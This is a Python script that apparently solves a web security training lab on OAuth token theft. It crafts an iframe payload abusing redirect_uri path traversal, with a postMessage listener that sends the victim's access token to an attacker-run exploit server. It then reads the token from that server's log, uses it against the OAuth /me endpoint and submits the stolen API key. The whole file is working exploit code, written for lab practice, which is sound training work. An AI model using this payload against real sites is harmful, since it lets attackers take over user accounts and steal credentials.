import sys
import requests
from bs4 import BeautifulSoup

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

home_url = f'https://{site}/'
resp = s.get(home_url)

soup = BeautifulSoup(resp.text,'html.parser')
exploit_url = soup.find('a', {'id':'exploit-link'}).get('href')
exploit_url = exploit_url.rstrip('/').lstrip('https://')

# Get from auth endpoint during login process
oauth_server_url = ''
client_id = ''

# Construct a link to the comment form within an iframe.
# Include a script which will exflitrate the victim's access token
# when they access the exploit server
exploit_script = f'''<iframe src="\
https://{oauth_server_url}/auth?client_id={client_id}\
&redirect_uri=https://{site}/\
oauth-callback/../post/comment/comment-form&response_type=token\
&nonce=-1552239120&scope=openid%20profile%20email"></iframe>

<script>
    window.addEventListener('message', function(e) {{
        fetch("/" + encodeURIComponent(e.data.data))
    }}, false)
</script>
'''

formData = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_script,
    'formAction': 'DELIVER_TO_VICTIM'
}
resp = s.post(f'https://{exploit_url}/', data=formData)

# Retrieve the victim's access token from the exploit server log
exploit_log = f'https://{exploit_url}/log'
resp = s.get(exploit_log)
log_text = resp.text
token_index = log_text.rfind("token%3D")
token = log_text[token_index+8:token_index+51]

# Submit the access token to the authentication server
me_url = f'https://{oauth_server_url}/me'
header_data = {
    'Authorization' : f'Bearer {token}'
}
resp = s.get(me_url, headers=header_data)

# Retrieve the victim's api key and submit the key to complete the lab
secret_key = resp.json()['apikey']
solution_url = f'http://{site}/submitSolution'
resp = s.post(solution_url, data={'answer': secret_key})